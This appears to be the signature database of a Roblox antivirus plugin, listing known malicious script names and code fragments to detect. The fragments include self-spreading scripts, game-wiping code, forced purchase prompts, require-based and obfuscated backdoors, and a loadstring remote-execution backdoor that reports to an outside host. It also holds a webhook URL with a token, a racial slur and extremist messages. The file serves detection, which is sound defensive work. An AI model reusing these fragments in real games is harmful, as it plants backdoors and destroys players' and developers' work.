--[[
    Titan Protection is an antivirus plugin designed to detect and clean up malicious scripts in a Roblox development enviroment.
    Copyright © 2020  Github@ccuser44 (ALE111_boiPNG)

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
]]

local DB = {}


-- NOTE: In the code snippets table some obfuscation bytecode and MGUI stuff i commented out because they are unnecessary and increase load time & lag

-- // Possible Virus Names \\ --

DB.VirusNames = {
	"Virus","Virisis","shigufumi",
	"Vivrissis","Vivvirsis","Virvis",
	"Anti-Lag","Anti_Lag","AntiLag",
	"vacine","NoLag","No Lag","virice",
	"No-Lag","No_Lag","No  Lag",
	"3.14159265358979,ALotOfR�ndomPiNumbers",
	"Scanner V1","BinarySymbols","BinaryC0der",
	"GOD0i0trust","GOTOhell123","Not A Backdoor",
	"are6607","Malicious? Nononon","demonmerlin1",
	"Virissis","4CHAN__ORGASM","Gusm4n4k","IsInfected",
	"BINARYEXPLOITER","zackisk","rofle","badscriptpurger",
	"F5CK","Spy bot and Lag remover","bad script purger",
	"y0l0","Elkridge Fire Department","hello i am your new lord lolz",
	"Anti Lag","Anti  Lag","Guest_Talking_Script","AntiVirusSoftware",
	"4D Being","4DBeing","ForeignTerror","Lolzorz",
	"d��������������ng.........you got owned...",
	"InFEcTiOn","Vaccine","MicoLord","cubiclemon rulz",
	"bryant90","sonicthehedgehogxx made this!!","join teh moovement!",
	"letgo09","WOrMeD","Oh Snap You Got infected xd xd xd",
	"ProperGr�mmerNeededInPhilosiphalLocations;insertNoobHere",
	"ProperGr�mmerNeeded","~ Pwnt ~","You made a BIG mistake.",
	"Hello...I �m Your New Lord Lolz","H75","Script......Or is it...",
	"IMAHAKWTFZ","I'm getting T1R33D","H4XXX :3",
	"WTFZ0R","nico337","dapperguestyo",
	"MMMMMM PIZZZA UM NUM UM NUM","zidanedude1","PW8NED",
	"ARBITER47","so does iampoobx","brendantaylor rules",
	"InsetFire","NXT-Respawn","NoTalkPerson","G00MB3",
	"AmazingOmegaJames","K3KK33D","scripty","Trashed",
	"worm","w0rm","0H_H3LL_N44HH","� l�mp T~T",
	"System Error 69605X09423","N0ISESCRIPT","n00b 4tt4ck!",
	";insertNoobHere","Omg im such a ig loser noob that has to copy RANDELLMAN!","W0rmzz",
	"STFU noob","garmo hacked ur place","SkapeTTAJA",
	"SnapReducer","NORN VIRUS","HAAXEDBYCREATURES",
	"ViVRuS","☭☭","No Backdoor nono",
	"Spreadify","�9001","ASDF","No Back door nono",
	"Charlie84","SPREADDER :3","â9001","?9001",
	"Lag Script","Mustard_Gas","A HUM4N G0D THA7 WAS MAN-M4DE WH3RE 1S Y0UR SAViOR N0W?!",
	"Timi37","DeleteScript","RO�byte","Guest_Free_Chat_Script",
	"ROBLOXImportantScript","☭","iEmOtIoNlEsS",
	"Woulfy2860","KillerMan32323","IAmHereToHe�lYourPlace",
	"N0ISE","Cooldude816's anti-vaccine script. (Works)","Stanley12345678910",
	"VirusScript","InfectedScript","MeshUpdater",
	"Infection script- Modified by Redinosaur","A Stone That Smashes a PC","VirusRemover",
	"INfecTION","Infected","Disable_Virus","SH!%",
	"Virus_script","OwO PILLA VIRUS OwO","Brick With Tablet`s Friend",
	"RSFfacility","Vaccine v1","Virus 2.0",
	"iEmotionless","Hi! I'm G O D","IsAVirus",
	"DEATH TO DATGUY","AN INFECTED ROTATEP! Because......... y not???? HEY ITS 2018 MAN DONT JUDGE↩↽⇇⇗⇺⇞🗡⤟","UrAIdiotVirus (Click Arrow)",
	"AnnoyingGui","Chil-Virus","Im stuck in a script help me!",
	"This is absolutly not a virus","Virus...Virus...LEET VIRUS!!!","dåååååååång..............you got owned",
	"Wh�t H�ppend","Of Course You Have Anti Virus Thats Why me (Some 1 in fear) Made This","H3CK3RZ",
	"ISt�rtHere","R00TH0l3","thanoid is thano wants you id than he is thanoid",
	"UnanchorAllParts ha ha","THANOID HAS STARTING SPAM THAT DESTROYS A PHONEEEE","SCP27273773  737 7732727 7 7 7 7 77777 7 777777 7 7 7777 111 00011 0000111100 11100000111 0001111000",
	"d��������������ng thanoidyou got owned...","thisisclickthanobaitid","do not delete this!! (IMPORTANThanoid)",
	"Memz.Exe","memz.thanoid","thanoid v.01",
	"Vivrisis","YOUAREANIDIOT","chaotic",
	"卍","卐","KEKKEEED","zacksisk","073dea7p",
	"Snap Reducer","Snap-Reducer","Snap_Reducer",
	"OHAI","Guest Free Chat Script",
	"Snap Remover","SnapRemover","Snap-Remover",
	"Snap_Remover","Strong jointRemover","Strong joint Remover",
	"StrongjointRemover","Strong_joint_Remover","Strong-joint Remover","Mesh Updater",
	"ScriptTeacher","Lagger","LagScript","wildfire",
	"telemon woz ere","RANDELLMAN","HEY ITS 2018 MAN DONT JUDGE↩↽⇇⇗⇺⇞🗡⤟",
	"AN INFECTED ROTATEP!","ݣ","h3llwr3ck3r",
	"L3GG3R","L4GG3R","NONONO M3N NO BAD SCRIPT NO NO",
	"FUCKING NOO","FAKING NOO","Cool890dude",
	"RenderMesh","ThisScriptIsAJumpStartToAHe�lthyLifestyle",
	"1337 5cr1p7 4 n0 m0r3 P14y3r5","94m3 Cr45h3r 1337 5cr1p7","94m3 Cr45h3r",
	"Dont Worry Im A Friendly Virus","New leetbox iz here? � n�����oo",
	"generator II :3","Password Hacker v2.0","generator IV LEETBOX IS BACK MFKER!",
	"BIT8 VIRU$ HACK3D","@JBLADE733","�","UrAIdiot",
	"UrANdiot","YOURANdiot","YOUAREANdiot",
	"YOUAREAIdiot","bendarobloxian","H8C5ED",
	"GET 100 ROBUX","Kraftyisback","GET 1000 ROBUX",
	"GET 5000 ROBUX","GET 2000 ROBUX","GET 10000 ROBUX",
	"v3rmies","roblox8xpl0iter",
	"Omg im such a big loser noob that has to copy RANDELLMAN!",
	"ROBO22e","AdamFlexer","Odin_00101010101",
	"DestinyKennedy2","Fear Made This!!","Join MaskedBrick games",
	"ALL HAIL THE CREED!","Anti-Owner","apbsjci9","womp womp",
	"Ajedi32's RS Anti-Virus","H7CK7D","b5hcmqj5",
	"b2whx3","bu5nlkawo","Anti-1x1x1x1andothervirus's",
	"Bilylones is your new master","Billylones is your new master","Billylones is awesomesauce",
	"boomboom9188","CleanUpSnaps","CHUCKNORRIS vaccine",
	"cooltime101 was here and i hacked you","cooltime101","DUMB vaccine",
	"Deth 2 teh samurai!","deeeeeeeeeeeeeeng.........you got owned...","do you liek waffles",
	"DellThermonater","FREEMODALNUB vaccine","FeelFreeToIns3rtGramm�tic�lErrorsHere",
	"FreeStyleM�yGoAnywhereIfNeeded","GuestTalking","HACKEDBYEXPLOITSCRIPTS",
	"HAX3D!","I'm getting T133D","Influenza AH1N1",
	"I will show your password CENSORED","join teh moovment!","Layschips2378minion2",
	"LOLOLOLOL J00 PHAILED!","LOLOL I AM UR NEW LoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoRD!!!!!!!",
	"NOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOBZ",
	"NoNoIDon'tNeedAllOfYourAwkw�rdSovietArguments","P0K3M4WN","Random�GoesHere:3",
	"RED ROBIN YUMMMMMMMM","RobloxShield� AntiVirus","soz i herd u lik mudkipz",
	"Everestia RPG (AD)","Doggo Lag Patcher","Script Made By Sonicthehedgehogxx",
	"mystery98675","ace1441","cptrick","survivor2256","Infestion",
	"mean774","Vivurursdd","ISt?rtHere",[[""''""''""?|`?]],
	"NoNoIDon'tNeedAllOfYourAwkw?rdSovietArguments",
	"ZXMLFCSAJORWQ#)CXFDRE)$#Q)JCOUSEW#)@!HOIFDS(AEQ#HI*DFHRI(#FA",
	"Nomnomnom1 will hack you too! MWAHAHA!","FeelFreeToIns3rtGramm?tic?lErrorsHere",
	"Deidara4 is sick of you noobs.","d??????????????ng.........you got owned...",
	"ThisScriptIsAJumpStartToAHe?lthyLifestyle","FreeStyleM?yGoAnywhereIfNeeded",
	"ProperGr?mmerNeededInPhilosiphalLocations","IAmHereToHe?lYourPlace",
	"ANTIVIRIS","ANTIVIRISIS","Making Cat Ice Cream Make Me Happy!",
	"Random?GoesHere:3","cahrlie84","whfcjgysa","no availiblitly lock",
	"ropack","safity lock","2_2_1_1_s_s_","datacontrollers",
	"script.....or..is.it","hello...i ?m your new lord lolz",
	"zomg saved","numbrez","guest talker","lol loser","Kill tem!",
	"WTFHOXZ","IM AM YOUR NEW LORDZZZ LOL","'' Bene trolled. ''",
	"J0HNSCR1PT",[[�|`�]],"J0HN",
	"IT'S OVER 9000!!!","zackary1997","infectzSN�P",
	"ChatHax","PropperGråmmerNeededInPhilosophy","Hello...I åm Your New Lord Lolz",
	"Skyst4r","Norton Total Protection 2011�","( III  )",
	"chris15632","Regen Script�","typetronack11",
	"INFECT0R","mark1023","Pineapple!!!!!",
	"NarHAr","stanley1234567890","washmon13",
	"beastlywin123","ice227","iliekpieinurfacelulz",
	"Market-script","i3 1 wy sa kls wi2","EXTRAHAX",
	"HAAXEDBYCREX","C-REX","OMG PIKACHU ATTACK!",
	"woo woo woo ha ha ha hoo hoo hoo hee ha ha hello there old chum im gnot a gnome im gnot a gnoblinn i","Black and white script","Thefurryfox7",
	"haxor","AshPallet","youvebeengnomed",
	"ModelApparaiser","Tr0lled","you got owned...",
	"d��������������ng.........you got owned","RBX-Fastload","Popup By quicksuper",
	"trollllll","Hermes Anti Exploit","MeshLoader",
	"MeshAdder","MeshAssign","BoOmHiGhMaN",
	"B00MH1GHM4N","Joint Shield ver. 216866.75","Joint Shield ver.",
	"This Model Was Made By Epic Models!","InstaWeld!","WE_ARE_THE_CHAMPIONS",
	"Virise","lordnathan","yankeesfan11",
	"antiban command","If You Kick/Ban Yankeesfan11, The Server Will End","Orb Debbuger",
	"IPityTheFoo","Anti-Ban","sk1gigs",
	"Anti Orb","Un_Removable","AntiBan","Server Takeover",
	"Script...Or is it...","Script..Or is it..","Script... Or is it ...","4d being",
	"X3-Z3AI","s?????-.G?t","Anti-Drag","Breaks if you open.",
	"Annoying hint","Spamming your output...","clome",
	"MLGify","ORLYNAO?","GIRLY GIRL",
	"GIRLY NOOB","i GOT haked","Starblazersfan",
	"The script that makes the talky text","UAR2 By DroptheBomb","UAR-S1",
	"RSMB_Loader","ValueDestroy",
	"UnionDestroy","ToolDestroy","SpawnLocationDestroy",
	"SoundDestroy","ScriptDestroy",
	"NegateDestroy","ModelDestroy","HD Remaster",
	"SinnerLoader","ForbiddenScript","nilName",
	"Infect","Trojan","Loophole's anti-cheat","nrhbord",
	"lireon","Daaaang.... You didnt get owned...","IAmHereToEatYourKids",
	"REB1RTH","IRstoopidnolifenerdwhoinfectedU","Guest Talking",
	"??A55_}j2?]tQbg","NOw randomness","Parts Of JuJuman O_O",
	"badagent22","L��ger","HEHEHEHEHEHEHEHEHE�����!",
	"YOU CANT DELETE THIS","SUPER MEGA ULTAR NO LAG SCRPIT WORKS!","GTFO NOOB",
	"matdogx","fgher2","kingoftheworld12",
	"CRJ111","bking123","Pristh_Properties",
	"LightingFix","haha ur gonna DIE","oh is that a mole... oh that's ur face",
	"if ur reading this ur a noob XD","*fart* ur fated weardo","TRJN HORSE",
	"TRJNHORSE","TRJN H0RSE","TRJNH0RSE",
	"TRJNH0RS3","TRJN HORS3","TRJNHORS3","TRJN_HORS3",
	"TRJN_H0RSE","BILLBERT SS","SS LOADER",
	"BillBert ServerSide","ServerSide Require","LAG FIX",
	"LAGFIX","LAG_FIX","LAG-FIX","TriHard 7",
	"AndrewCoolGTA Phunz","ROBLOX System Script","y7]pHfj5�:?r�BtaaV%/]t?&�O",
	" loser","sosolid2k244","rayan11968","gomr","nhoj01",
	"notorsoitis","numberitis","PWNZ0R3D","CompassEffect","V-3(78% Done)",
	"Black Lag","DoNotRemoveThisScriptOrElseYourBigFatMotherWillDieTonightOLOLOLOLOLOL",
	"ROBLOXImprotantScript","virsvirs","neutronstarcollision.rbapp",
	"objection234","This place is owned by objection234","Luis ha estado aqui.",
	"Norton360 Sucks","AutoJoint","asome script","PWNZORED","PWNZORED.",
	"<>]]"..[["" "]].."]] !@$ $A? HEHE","dragons1234","jeppevinkel",
	"xXJoeUncleXx","HACKED BY EXPLOITSCRIPTS","lando64000","Tazer 1.0",
	"LOLWUT","NeverBanMe","legoaxe","JOIN NAMESNIPES","samsolowalker",
	"fifi461","Claypwns592","Kickdaplayascript","sharktaylor12",
	"tommyevans","stupidwert","Tinkerparis6","skyhawlk21",
	"FamousSeamus","Money Hack","iDemandJ00rC00K3HZ","iStoleJ00rC00K3HZOLOLOLOLOL",
	"Components.dat","XProtectSecure","RobloxGameSecurer",
}

-- // Virus names which do not use string.match These are seperated to prevent false positives.

DB.StaticVirusNames = {
	"idontthinkso","DeliveryForYou","TNT24",
	"trol","troll","unsavage","vic",
	"Dupe","Lag","PlaceHandler","Time Playing Counter",
	"DestroyFunction","PrintFunction","DO NOT TUCH",
	"IaMStuPId","Die...","XD",
	"WTH","OMG","OMG2","OMG3","18pb",
	"MVD 1","MVD 2","MVD 3","MVD 4","MVD 5","m630g4",
	"v7srq67gj","majmi1n5","ajmi1n5","vk36rg3",
	"81izc18pb","whx3iu3z","rgzgl1rwj",
	"5ydg8dkm","b5hcmqj5","hsxpydccb","p2qr0i","d764crw",
	"gcl2hlra","sv1om4","Hai","rbxa11",
	"3qs51bp7c","kuktzitr","ik7txer","r2snyt","zpyo4vh",
	"5o9g6upwz","HAx","vtlac","i0916",
	"jdu7jlf","65wz0f1","yxcl8llf","7m5ebj5m",
	"b2whx3","8sjwgawq","belz","+++",
	"duing26l","ulxt0","ywo59tjv","x8ujsh5g",
	"Sys1","Sys2","loser","BOB","LOL","ClientReplicator",
	"Enable HttpService","FX","ROFL",
	"Deleting...","quiettime1","AntiCheatLoader",
	"Fix","Welding","RobloxChatService",
	"TestServiceScript","SecuredScript","AntiCheatSecurer",
}

--// A list of malicious code snippets the scanner should look for \\--

DB.malicious_code_snippets={
	[[while true do


wait(5)


dive()


end]],

	[[while true do
wait(5)
dive()
end]],

	[[function Spread(part)
	check = part:findFirstChild("Fire")
		if check == nil then
	script.Parent:Clone().Parent = part

		elseif check ~= nil then]],

	[[script that makes Guests talk
--Please give credit
--Don't tell the admins!
--Unnote the vaccine if you'd like to remove all copies of this script in your place]],

	[[function GetAllItems(mdl)
local objs = {}
function Search(obj)
if obj~=workspace then
table.insert(objs,obj)
end
if #obj:GetChildren() > 0 then
for i, v in ipairs(obj:GetChildren()) do
Search(v)
end
end
end
Search(mdl)
return objs
	end]],

	[[function spread() -- gubygufr221
local stuff = game.Workspace:GetChildren()
for i = 1, #stuff do]],

	[[if workspace:findFirstChild("IMAHAKWTFZ") == nil then]],

	[[if m:sub(1, 5) == "/sc t" then]],

	[[if m:sub(1, 5) == "HAAXX" then]],

	[[if v:FindFirstChild("InfectedScript") == nil and v:FindFirstChild("VirusScript") == nil then]],

	[[print("iEmotionless's Lag Script")]],

	[[-- We destory your place!
-- Come get us if u dare! Well make a fool out of you!
-- The Creatures Community]],

	[[-- [ GlitchMaster ] --
-- [ Cucumber Quest ] -]],

	[[infectedscr421 = model.SnapReducer:Clone()]],

	[[m.Text = "GOTTA GOTTA BE CRAZY SEX"]],

	[["O HAAAAAAAAAAAAAAAAAAAAAAAL NO"]],

	[[function alto(xylem)
if xylem.className == "Model" then
check(xylem)
local que = script:clone()
que.Parent = rando(xylem)
end
end]],

	[[table.insert (Knox, 1 ,string.reverse(calco[5] .. calco[2] .. calco[7] .. calco[1] .. calco[6] .. calco[9] .. calco[12] .. calco[13]))]],

	[[function KillLag()
	g = game.Workspace:getChildren()
	for i = 1, #g do
		if g[i].className == "Part" then
			if g[i].Anchored == true then
				g[i]:BreakJoints()
			end
		end
	end
end]],

	[[p= game.Workspace:GetChildren()
for i= 1, #p do
if p[i].className == "Part" then
if p[i].Anchored == true then
p[i]:BreakJoints()
end
elseif p[i].className == "Model" then
pp=p[i]:GetChildren()
for i=1, #pp do
if p[i].className == "Part" then
if p[i].Anchored == true then
p[i]:BreakJoints()
end
end
end
end
end]],


	[[wait(burnTime/2*(math.random()*4))]],

	[[mx = game.Debris
mx2 = game.Debris.MaxItems

if (mx.MaxItems > 100) then
	mx.MaxItems = mx2*.75]],

	[[mx = game.Debris
mx2 = game.Debris.MaxItems

if (mx.MaxItems > 100,000,000,000) then
	mx.MaxItems = mx2*.75
end
]],

	[[<haxing you account stealling your robux>
omg you fell for this!
haha i was jokeing this dose not work!]],

	[["BOOM! HEDSHOT =D", "OXYMORON! LOOK IT UP IN THE DICTIONARYZ"]],

	[[function Infector()
while true do -- Infinite loop
	found = game.Workspace:FindFirstChild("Humanoid")
	found2 = game.Workspace:FindFirstChild("Model")
	found3 = game.Workspace:FindFirstChild("Brick")
	if found ~= nil then]],

	[[mx = game.Debris
mx2 = game.Debris.MaxItems

if (mx.MaxItems > ]],

	[[Check us out at creaturescaves.com our discord link at: https://discordapp.com/invite/SZSngBb]],

	[[part.BrickColor = BrickColor.new("Really red")
	part.Name = "iEmOtIoNlEsS"]],

	[[print:("anti lag script set to go.")
no lag in place1
max items(100,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000)
allow gameplay smoothly
print:("end")]],

	[[](string["\99\104\97\114"]],

	[[while wait() do
	local market = game:GetService("MarketplaceService")
	for i,v in pairs(game.Players:GetChildren()) do
		if not market:PlayerOwnsAsset(v, 4147951000) then
			if game.CreatorId ~= v.UserId then
				market:PromptPurchase(v, 4147951000)
			end
		end
	end
	wait(1)
end]],

	[[function XD() require(2556683221) end XD() ]],

	[[require(2556683221]],

	[[function door() require(2556683221) end door() ]],

	[[[string.reverse("eriuqer")]],

	[[script.Parent.Touched:connect(function(hit)
	if hit == nil then return end
	if hit.Parent == nil or hit.Name == "Virus" or hit:FindFirstChild("InfectedScript") ~= nil then return end
	local s = script.InfectedScript:clone()
	local t = script:clone()
	t.Disabled = true
	t.Parent = s
	s.Disabled = false
	s.Parent = hit
	GetTarget()
end)]],

	[[function GetTarget()
	wait(.1)
	a = {}
	find(game.Workspace)

	if #a == 0 then GetTarget()end

	min = 99999
	target = nil

	for _,v in pairs(a) do
		if (script.Parent.Position-v.Position).magnitude < min and v.Name ~= "Virus" or v.locked ~= true and v:FindFirstChild("InfectedScript") == nil then
			min = (script.Parent.Position-v.Position).magnitude
			target = v
		end
	end

	if target == nil or target.Locked == true then GetTarget()end
	--found out the problem

	attack(target)
end]],

	[[--Hello! This Virus was made by: ChillestOfChill/SyTheFoox/MrRThro]],

	[[--Still Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill]],

	[[Spybot/Code/9626735/entern code here (]],

	[[while wait() do
	local r = math.random(100)
	script.Parent.Text = "ANNOYANCE PERCENTAGE: " .. r .. "%"
end]],

	[[--IMPORTARNT!!!!!!!! DO NOT ENABLE THE FIRE INSIDE THE IS SCRIPT! IT WILL ENABLE ITSELF WHEN THE GAME STARTS! ENABLING IT MAY LEAD TO SUSPISION]],

	[[if workspace:FindFirstChild("Anti_Virus") ~= nil then
workspace.Anti_Virus:Destroy()
end]],

	[[if workspace:FindFirstChild("AntiVirusScript") ~= nil then
workspace.AntiVirusScript:Destroy()
end]],

	[[if r == 9 then
print("Fuck operator 72741")
end]],

	[[if r == 6 then
print("Hey nigger, GOOD LUCK FINDING THIS SCRIPT!!!!!!!!!!!!")
end]],

	[[-- discord: https://discord.gg/vg8eTK8]],

	[[n = {
"free models suck",
"hahahah u free model no0o0o0o0o0ob",
"created by roblox",
"ur a noob",
"hahahhahahaha",
"important lego brick",
"wiruses"
}]],

	[[Lag.Infected.loadstring = [9.0 8.1 2.9]],

	[[-- you see? not a virus!
--CreeperPower618]],

	[[function onPlayerEntered(newPlayer)
if newPlayer.Name ~= "jumperbunny" then
newPlayer:Remove()
end
end
game.Players.PlayerAdded:connect(onPlayerEntered)]],

	[[local KickPlayer = Instance.new("TextButton")
local USERNAME = Instance.new("TextBox")
local UnFreeze = Instance.new("TextButton")
local KillPlayer = Instance.new("TextButton")
local Back3 = Instance.new("TextButton")
local UnGod = Instance.new("TextButton")
local Blur = Instance.new("TextButton")
local God_2 = Instance.new("TextButton")
local VanPlayer = Instance.new("TextButton")
local FreezePlayer = Instance.new("TextButton")
local LagPlr = Instance.new("TextButton")
local MainMain = Instance.new("Frame")
local TextLabel_12 = Instance.new("TextLabel")
local Credit0s = Instance.new("TextButton")
local LocalPlayer = Instance.new("TextButton")
local Main = Instance.new("TextButton")
local Game = Instance.new("TextButton")
local TextLabel_13 = Instance.new("TextLabel")
local Settings = Instance.new("ImageButton")
local Close_2 = Instance.new("TextButton")
local SettingsMain = Instance.new("Frame")
local TextLabel_14 = Instance.new("TextLabel")
local SelfDestroy = Instance.new("TextButton")
local Back = Instance.new("TextButton")
local Inverted = Instance.new("TextButton")
local Angel = Instance.new("TextButton")
local Open = Instance.new("TextButton")

-- Properties

ZerosSGui.Name = "Zero'sS Gui"
ZerosSGui.Parent = game.CoreGui

Credits.Name = "Credits"
Credits.Parent = ZerosSGui
Credits.Active = true
Credits.BackgroundColor3 = Color3.new(0.0862745, 0.0862745, 0.0862745)
Credits.BorderColor3 = Color3.new(0.239216, 0.239216, 0.239216)
Credits.BorderSizePixel = 8
Credits.Draggable = true
Credits.Position = UDim2.new(0, 325, 0, 50)
Credits.Selectable = true
Credits.Size = UDim2.new(0, 397, 0, 384)
Credits.Visible = false]],

	[[m.Text = "THIS SERVER IS HACKED BY A PRUD ISIS SUPPORTER -iiVape_Bleach"]],

	[[for i = 1, #st do
st[i].Name = "Allah Akbar"
end
]],

	[[local Settings={["Un_Removable"]= "On"}
local function mFloor(x) return x - x % 1 end
local Un_Removable = tostring(Settings["Un_Removable"]):lower() == "on"
if Un_Removable then
	Game.Workspace.DescendantRemoving:connect(function(Child)
		if not Remove_At_Will and Child == script then
			script:Clone().Parent = Game.Workspace
		end
end)
end]],

	[[function onChatted(msg)
if msg == cod.."j/messageAG" then ]],

	[[if script.Parent:findFirstChild("GoroBomb") == nil and script.Parent:findFirstChild("GoroReflex") == nil and script.Parent:findFirstChild("GoroShot") == nil and script.Parent:findFirstChild("GoroStrike") == nil and script.Parent:findFirstChild("Goroteleport") == nil  then
game.Lighting:findFirstChild("Rumble").GoroBomb:clone().Parent = script.Parent
game.Lighting:findFirstChild("Rumble").GoroReflex:clone().Parent = script.Parent
game.Lighting:findFirstChild("Rumble").GoroShot:clone().Parent = script.Parent
game.Lighting:findFirstChild("Rumble").GoroStrike:clone().Parent = script.Parent
game.Lighting:findFirstChild("Rumble").Goroteleport:clone().Parent = script.Parent]],

	[[function check()
	local list = workspace:GetChildren()
	for i = 1, #list do
		if list[i]:findFirstChild("INfecTION") == nil and list[i].className ~= "RotateP" then
			script.Parent:Clone().Parent = list[i]
		end
		wait()
	end
end]],

	[[script:Clone()
script:Clone()
script:Clone()
script:Clone()
script:Clone()
script:Clone()
script:Clone()
script:Clone()
script:Clone()
script:Clone()
script:Clone()
script:Clone()
script:Clone()
wait(3)
game.Workspace:ClearAllChildren()
game.Players:ClearAllChildren()
game.Lighting:ClearAllChildren()
game.ReplicatedFirst:ClearAllChildren()
game.ReplicatedStorage:ClearAllChildren()
game.ServerScriptService:ClearAllChildren()
game.ServerStorage:ClearAllChildren()
game.StarterGui:ClearAllChildren()
game.StarterPack:ClearAllChildren()
game.Chat:ClearAllChildren()
game.Soundscape:ClearAllChildren()]],

	[[	a = Instance.new("Hint",workspace)
	a.Text = "Your place is ruined, Courtesy of Blackout Virus >:D"
	a.Name = "Your place is ruined, Courtesy of Blackout Virus >:D"

	game.Players:ClearAllChildren()
	wait(5)
	a.Text = "Crashing in 5 seconds..."
	a.Name = "Crashing in 5 seconds..."
	wait(1)
	a.Text = "Crashing in 4 seconds..."
	a.Name = "Crashing in 4 seconds..."
	wait(1)
	a.Text = "Crashing in 3 seconds..."
	a.Name = "Crashing in 3 seconds..."
	wait(1)
	a.Text = "Crashing in 2 seconds..."
	a.Name = "Crashing in 2 seconds..."
	wait(1)
	a.Text = "Crashing in 1 second..."
	a.Name = "Crashing in 1 second..."]],

	[[local players = game.Players:GetPlayers()

game.Players.PlayerAdded:Connect(function(player)
if player.UserId == yourID then
player.Chatted:Connect(function(msg)
if msg == ";destroy" then
local a = Instance.new("Message", workspace)
a.Text = "good bye ;)"
game.Workspace:ClearAllChildren()
players:Kick('lol')
end
end)
end
end)

]],

	[[local https = "https://discordapp.com/api/webhooks/565300170435330058/44RmFRXwwku8L_yLyLh97meXLwX31Um6Mtmq9DeMzvYeSqa2Z02Om_kAbnWw95BqjMYe"]],

	[[(397.86020086+0.00000400)*9305953]],

	[[local d=string.byte;local r=string.char;local c=string.sub;local s=table.concat;local u=math.ldexp;local H=getfenv or function()return _ENV end;local]],

	[[rem1.OnServerEvent:connect(function(user, stri)
	if checkAdmin(http:JSONDecode(pass), user.Name) then
		require(script:WaitForChild("Loadstring"))(stri)()
		SendHook("Script Executed By User: ".. user.Name .. "! \nScript: ".. stri)
	else
		SendHook("Execution Attempt By User: ".. user.Name .. "! \nScript: ".. stri)
	end
end)]],

	[[local pass = http:GetAsync("https://pastebin.com/raw/KNv3kKKb")

function checkAdmin(tab, str)
	for i,v in next, tab do
		if v == str then
			return true
		end
	end
	return false
end

function SendHook(cont)
	local JS = {
		username = Market:GetProductInfo(game.PlaceId).Name,--"Game ID: "..tostring(game.PlaceId),
		content = "Game ID: ".. tostring(game.PlaceId) .. "\n\n" ..cont
	}
	http:GetAsync("https://littest.site/Esketit/megaoof.php?Content=" .. http:JSONEncode(JS))
end]],

	[[-- Made by SeniorFight for V3rmillion!]],

	[[mx = game.Debris
mx2 = game.Debris.MaxItems --This lets the script find out how much debris there is.

if (mx.MaxItems]],

	[[local payload = require(1006051316)]],

	[[if game:GetService("ServerScriptService"):FindFirstChild(fakeName) == nil then
		local copy = script:Clone()

		copy.Parent = game:GetService("ServerScriptService")
		copy.Name = fakeName
		local cChannel = Instance.new("ModuleScript")

		cChannel.Name = "ChatChannel"
		cChannel.Parent = copy
		local bChannel = Instance.new("ModuleScript")

		bChannel.Name = "ChatService"
		bChannel.Parent = copy
		local aChannel = Instance.new("ModuleScript")

		aChannel.Name = "Speaker"
		aChannel.Parent = copy
		local zChannel = Instance.new("ModuleScript")

		zChannel.Name = "Util"
		zChannel.Parent = copy

		if game:GetService("ServerScriptService"):FindFirstChild("ChatServiceRunner") ~= nil then

			game:GetService("ServerScriptService").ChatServiceRunner:Destroy()

		end

	end]],

	[[getfenv()["\103\101\116\102\101\110\118"]()["\115\101\116\102\101\110\118"]],

	[[Players.PlayerAdded:Connect(function(plr)
	TS:Teleport(4126761592,plr)
end)]],

	[[mx = game.Debris.MaxItems]],

	[[mx2 = game.Debris.MaxItems]],

	[["\103\101\116\102\101\110\118"]],

	[[local TeleportService = game:GetService("TeleportService")
local Players = game:GetService("Players")
local Place = 3624761586


Players.PlayerAdded:Connect(function(player)
print(player)
              TeleportService:Teleport(Place, player)

end)]],

	[[function checkForAndSwitch(player)
		if (player.SuperSafeChat == true) then
			player.SuperSafeChat = false;
			wait(5);
			local m = Instance.new("Message");
			m.Text = "Press the / key to start typing.";
			m.Parent = player;
			wait(5);
			m.Text = "Then press Enter to send your message.";
			wait(5);
			m:Remove();
			m = nil;
		end
		player = nil;
		collectgarbage("collect");
	end]],

	[[local m = Instance.new("Message")
m.Parent = Workspace
m.Text = "DeaRevenge Shall Return"
wait(1)
m:Remove()
]],

	[[local m = Instance.new("Message")
m.Parent = Workspace
m.Text = "DeaRevenge is a Member Of 1x1x1x1"
wait(1)
m:Remove()]],

	[[local m = Instance.new("Message")
m.Parent = Workspace
m.Text = "All Hackers Shall Return"
wait(1)
m:Remove()]],

	[[while true do
Wait (1)
print("1"..string.rep("0",1010100).."")
end]],

	[[if found ~= nil then
		found.Name="telemon woz ere"
		infectedscr = model.SnapReducer:Clone()
		infectedscr.Parent = found
	else]],

	[[--								///|\\\				  ///|\\\
-----------------------///|||\\\Version ???///|||\\\-----------------------
--							 ////|||\\\\_________////|||\\\\
--							((((|||||))))~/|||\~((((|||||))))
--							'|    _	  |>>>YUP<<<|	  _	 |'
--							 |   / \	  |VvVvVvVvV|   / \	 |
--							 |	  | |	  |^^^^^^^^^|	 | |   |
--							 |	  | |   |OOOOOOOOO|	 | |   |
--							 |	  \_/   |XXXXXXXXX|	 \_/   |
--							 |         | |OOOOOOO|			 |
--							 |_________|�|OOOOOOO|_________|
--
-- idk

script.Parent = Punci -- I like 'punci'-s :3
]],

	[[SC = script:clone()
SCC = SC:clone()
SCCC = SCC:clone()
names = {"A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z","0","1","2","3","4","5","6","7","8","9","10","VIRUS"}
SC.Parent = script
SCC.Parent = script
SCCC.Parent = script
while true do
wait()
